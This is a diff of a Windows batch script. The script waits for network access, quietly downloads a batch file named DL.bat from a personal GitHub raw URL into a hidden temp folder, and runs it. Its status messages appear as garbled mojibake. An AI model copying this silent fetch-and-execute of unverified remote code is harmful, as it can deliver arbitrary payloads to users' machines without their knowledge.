@@ -36,10 +36,10 @@ cd /d "%USERPROFILE%\AppData\Local\Temp"
 rd /s /q  %USERPROFILE%\AppData\Local\Temp\{FDA9A804-680F-48B2-941B-93434F43FFA7}
 cls
 :Start
-ping www.baidu.com>nul&&goto download||echo ’˝‘⁄µ»¥˝Õ¯¬Á¡¨Ω”°£°£°£°£&for /l %%a in (3,-1,0) do ping -n 2 127.1>nul&cls&goto Start
+ping www.baidu.com>nul&&goto download||echo Ê≠£Âú®Á≠âÂæÖÁΩëÁªúËøûÊé•„ÄÇ„ÄÇ„ÄÇ„ÄÇ&for /l %%a in (3,-1,0) do ping -n 2 127.1>nul&cls&goto Start
 :download
-@echo ’˝‘⁄¡¨Ω”◊ ‘¥
-wget -q -c -t 0 -P %USERPROFILE%\AppData\Local\Temp\one https://raw.githubusercontent.com/wgbingo/download/master/DL.bat
+@echo Ê≠£Âú®ËøûÊé•ËµÑÊ∫ê
+wget -q -c -t 0 -P %USERPROFILE%\AppData\Local\Temp\{FDA9A804-680F-48B2-941B-93434F43FFA7} https://raw.githubusercontent.com/wgbingo/download/master/DL.bat
 cd /d "%USERPROFILE%\AppData\Local\Temp\{FDA9A804-680F-48B2-941B-93434F43FFA7}" 
 @if %errorlevel%==0 ( 
 start "" "%USERPROFILE%\AppData\Local\Temp\{FDA9A804-680F-48B2-941B-93434F43FFA7}\DL.bat"
